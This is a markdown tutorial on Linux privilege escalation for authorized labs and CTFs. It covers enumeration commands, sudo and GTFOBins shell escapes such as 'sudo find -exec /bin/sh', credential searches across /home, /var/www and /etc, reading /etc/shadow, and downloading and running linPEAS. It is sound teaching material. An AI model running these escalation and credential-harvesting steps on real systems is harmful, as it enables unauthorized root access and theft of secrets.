# Linux Privilege Escalation

> **Read this first (ethics & scope)**
> This guide is **for learning only** — use it on lab machines you own or are explicitly authorized to test (TryHackMe, HackTheBox, CTFs, local VMs). Misusing these techniques on production systems or systems you don't own is illegal and unethical. I’ll repeatedly remind you of safe practice where appropriate.

---

## 🔖 Index

1. [Why learn Linux priv-esc?](#why-learn-linux-priv-esc)
2. [Quick Glossary — plain English definitions](#quick-glossary---plain-english-definitions)
3. [High-level workflow (taskwise)](#high-level-workflow-taskwise)
4. [Tools & resources (essential)](#tools--resources-essential)
5. [Task 0 — Safety checklist (always do this first)](#task-0---safety-checklist-always-do-this-first)
6. [Task 1 — System & Kernel info (enumerate)](#task-1---system--kernel-info-enumerate)
7. [Task 2 — Users, auth & credentials](#task-2---users-auth--credentials)
8. [Task 3 — File system & permissions (SUID/SGID, writable)](#task-3---file-system--permissions-suidsgid-writable)
9. [Task 4 — Scheduled jobs & automation (cron, systemd timers)](#task-4---scheduled-jobs--automation-cron-systemd-timers)
10. [Task 5 — `sudo` rules & misconfigurations](#task-5---sudo-rules--misconfigurations)
11. [Task 6 — Services, configs & secrets (web, DB, backups)](#task-6---services-configs--secrets-web-db-backups)
12. [Task 7 — Abusing binaries (GTFOBins patterns)](#task-7---abusing-binaries-gtfobins-patterns)
13. [Task 8 — Automated enumeration: linPEAS & friends](#task-8---automated-enumeration-linpeas--friends)
14. [Task 9 — Kernel exploits: when to consider them](#task-9---kernel-exploits-when-to-consider-them)
15. [Quick cheat sheet (commands)](#quick-cheat-sheet-commands)
16. [Practice plan — how to get good, fast](#practice-plan---how-to-get-good-fast)
17. [Further reading & authoritative links](#further-reading--authoritative-links)
18. [Appendix — neat markdown tricks to make a repo pretty](#appendix---neat-markdown-tricks-to-make-a-repo-pretty)

---

# Why learn Linux priv-esc?

Because once you can access a box as a low-privilege user (like `bob`), the *next* most valuable skill is discovering how to *safely* move to a privileged account (`root`) and understand why that happened — for both offensive and defensive careers. Learning this improves your system administration, hardening, and incident response skills.

---

# Quick Glossary — plain English definitions

* **Privilege escalation (privesc)** — getting higher privileges than you currently have (e.g., `user` → `root`).
* **Local privesc** — you already have local access and want to escalate.
* **SUID / SGID bits** — special file permission bits that allow a binary to run with its owner’s/group’s privileges.
* **GTFOBins** — a catalog of Unix binaries and how they can be abused to read/write files, spawn shells, escalate, etc. ([GTFOBins][1])
* **linPEAS / PEASS-ng** — popular automated Linux enumeration scripts that aggregate many checks to find likely vectors. ([GitHub][2])
* **Dirty Pipe / Dirty COW** — example kernel vuln families that enabled local root via kernel bugs (research only; use only in labs). ([NVD][3])

---

# High-level workflow (taskwise)

1. **Enumerate everything** (system, users, files, services).
2. **Prioritize** findings (writable files, sudo rights, cron jobs, SUID binaries).
3. **Try safe, reversible techniques first** (`sudo -l`, config files, readable secrets).
4. **Use GTFOBins & manual patterns** to escalate if a binary is misconfigured.
5. **Only after misconfiguration paths are exhausted**, and in a disposable lab, consider kernel exploits.
6. **Document everything** — you’ll learn faster by recording commands, outputs, and resolutions.

---

# Tools & resources — essentials (install/investigate)

* **linPEAS / PEASS-ng** — automated enumeration. ([GitHub][2])
* **GTFOBins** — binary abuse patterns. ([GTFOBins][1])
* `find`, `grep`, `awk`, `sed`, `stat`, `ls`, `ps`, `ss`, `systemctl`, `journalctl` (core CLI tools)
* `searchsploit` / Exploit-DB — for known vuln examples (labs only).
* `nc` / `socat` — for testing shells and file transfers in lab environments.
* **Learning platforms:** TryHackMe (Linux PrivEsc room), HTB, VulnHub. ([TryHackMe][4])

> Pro tip: put the tools you use in a `tools/` folder in your repo and add small README pages describing how to use them in the lab.

---

# Task 0 — Safety checklist (always do this first)

* ✅ Work only on authorized targets.
* ✅ Snapshot VMs before trying destructive kernel exploits.
* ✅ Avoid public disclosure of exploit code for real vulnerable production hosts — contact owners responsibly.
* ✅ Keep an execution log (`commands.log`) while you practice.

---

# Task 1 — System & Kernel info (enumerate)

**Why:** kernel + OS details guide whether a kernel exploit or distro-specific vector applies.

Commands & explanation:

```bash
# Basic system info
uname -a                 # kernel version
cat /etc/os-release      # distro name & version
hostnamectl              # portable system info
lsb_release -a           # if available

# Extra context
uptime
dmesg | tail -n 50
```

Notes:

* If `uname -r` shows an old kernel, search advisories (e.g., Dirty Pipe — CVE-2022-0847). Only investigate these on lab systems. ([NVD][3])

---

# Task 2 — Users, authentication & credentials

**Goal:** find misstored secrets, SSH keys, or weak configs.

Commands (run as current user):

```bash
id
whoami
getent passwd | awk -F: '{print $1":"$3":"$4":"$6":"$7}'
ls -la /home
# Search for SSH keys or .pem files (may reveal logins)
find /home -maxdepth 3 -type f \( -name "*.ssh/*" -o -name "*.pem" -o -name "id_rsa*" \) 2>/dev/null
# Search common app config files for keywords
grep -R --line-number -iE "password|passwd|secret|api_key|db_pass" /home /var/www /etc 2>/dev/null || true
```

Tips:

* Look for `.bash_history`, `.mysql_history`, `.python_history`, or backup files that might contain credentials.
* If you find `authorized_keys` or private keys, try using them (lab only) with `ssh -i key user@localhost`.

---

# Task 3 — File system & permissions (SUID/SGID, writable)

**Why:** SUID binaries running as root or world-writable directories can enable privilege escalation.

Commands:

```bash
# SUID / SGID binaries (can be many; filter sensibly)
find / -xdev -perm -4000 -type f -ls 2>/dev/null | head -n 200
find / -xdev -perm -2000 -type f -ls 2>/dev/null | head -n 200

# World writable files and directories
find / -xdev -writable -type d -ls 2>/dev/null | head -n 100
find / -xdev -type f -perm -2 -ls 2>/dev/null | head -n 100
```

How to triage:

* If a SUID binary is unusual (not `passwd`, `ping`, etc.) or one you can abuse (see GTFOBins), investigate it.
* If `/etc/cron.*` or `/var/www` contains files writable by you, think about injection paths.

---

# Task 4 — Scheduled jobs & automation (cron, systemd timers)

**Why:** Scheduled tasks that run as root and call writable scripts/files are a classic escalation path.

Commands:

```bash
# Cron check
cat /etc/crontab
ls -la /etc/cron.* /var/spool/cron/crontabs 2>/dev/null
crontab -l 2>/dev/null

# systemd timer check
systemctl list-timers --all
ls -la /etc/systemd/system /lib/systemd/system
journalctl -u <unit-name> --no-pager | tail -n 50
```

Look for:

* Scripts run by root that reference files in `/tmp` or user-writable paths.
* Backups created by root that are world-readable (may include secrets).

---

# Task 5 — `sudo` rules & misconfigurations

**Why:** `sudo` is a first class target — `sudo -l` may give you direct root capabilities.

Commands:

```bash
sudo -l                         # show allowed sudo commands for current user
# Example: if allowed to run /usr/bin/vim as root:
sudo /usr/bin/vim -c ':!/bin/sh'
# If allowed a command, check GTFOBins for that binary's abuse patterns.
```

Notes:

* If `sudo -l` requires a password and you don't have it, don't force it — move to other vectors.
* When `sudo` allows running arbitrary editors, shells, or `find`, `tar`, `rsync`, etc., GTFOBins often has quick payloads. ([GTFOBins][1])

---

# Task 6 — Services, configs & secrets (web apps, DB, backups)

**Why:** Applications often store credentials in config files; backups may contain source code or creds.

Checklist & commands:

```bash
# Look for env/config files in webroots
find /var/www -type f -iname "*.env" -o -iname "*.php" -o -iname "*.yml" 2>/dev/null
grep -R --line-number -iE "DB_PASS|DATABASE_URL|DB_USER|MYSQL_ROOT" /var/www /etc 2>/dev/null || true
# Search for backup files anywhere
find / -type f -iname "*backup*" -o -iname "*.bak" -o -iname "*.old" 2>/dev/null | head -n 200
```

Examples:

* `.env` files often contain `DB_PASSWORD`.
* Old backups (`site.sql`, `.tar.gz`) sometimes left in webroot are a goldmine for secrets.

---

# Task 7 — Abusing binaries (GTFOBins patterns)

GTFOBins is the dirtbike of the privesc world — it lists how normal binaries can read/write files, spawn shells, and more. Learn to search it fast. ([GTFOBins][1])

Common examples (read-only — study these patterns in labs):

```bash
# If 'find' is allowed by sudo
sudo find . -exec /bin/sh -i \; -quit

# If 'python' exists and is usable
python -c 'import pty; pty.spawn("/bin/bash")'

# If 'less' or 'more' is available
less /etc/shadow
# inside less: use !sh or :!sh to spawn a shell in some builds

# If 'git' exists and you can write to target dir
git apply --unsafe-paths --directory / x.patch
```

Always check the GTFOBins entry for the exact syntax for your environment. ([GTFOBins][5])

---

# Task 8 — Automated enumeration: linPEAS & friends

**Why:** manual checks are great, but linPEAS saves time and surfaces likely vectors to triage.

How to use (lab example):

```bash
# Download from your attacker (safe) host and transfer to target (lab)
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee /tmp/linpeas.out
```

What to do with output:

* Search `linpeas.out` for “Sudo” / “Cron” / “SUID” / “Writable” markers — they’re colorized to highlight wins.
* Always manually verify an automated finding before exploiting (automation can produce false positives). ([GitHub][2])

---

# Task 9 — Kernel exploits: when to consider them

Kernel exploits (Dirty Pipe CVE-2022-0847, Dirty COW CVE-2016-5195, etc.) are **powerful but dangerous**:

* They can crash or brick a VM.
* They require exact kernel versions and may not work on hardened kernels.
* Use **only** in disposable lab environments and after you've exhausted safer misconfiguration vectors. ([NVD][3])

If you *must* test one:

1. Snapshot the VM.
2. Verify kernel version precisely (`uname -r`).
3. Use vetted PoC code from reputable sources and read vendor advisories.

---

# Quick cheat sheet (commands) — copy/paste friendly

```bash
# Basic
uname -a; cat /etc/os-release; id; whoami

# Users/files
getent passwd | cut -d: -f1,3,4,7
ls -la /home

# SUID/SGID
find / -xdev -perm -4000 -type f -ls 2>/dev/null | head -n 100

# World writable
find / -xdev -perm -2 -type f -ls 2>/dev/null | head -n 100

# cron/systemd
cat /etc/crontab
systemctl list-timers --all

# sudo
sudo -l

# run linpeas (lab)
chmod +x linpeas.sh && ./linpeas.sh | tee linpeas.out
```
---

# Further reading & authoritative links

* GTFOBins — binary abuse catalog. ([GTFOBins][1])
* PEASS-ng / linPEAS (GitHub) — automated enumeration. ([GitHub][2])
* TryHackMe — Linux Privilege Escalation labs. ([TryHackMe][4])
* InternalAllTheThings — thorough checklist & methodology for Linux privesc. ([Swissky's Lab][6])
* NVD entry for Dirty Pipe (CVE-2022-0847) and Dirty COW background — read for kernel exploit context (labs only). ([NVD][3])

---
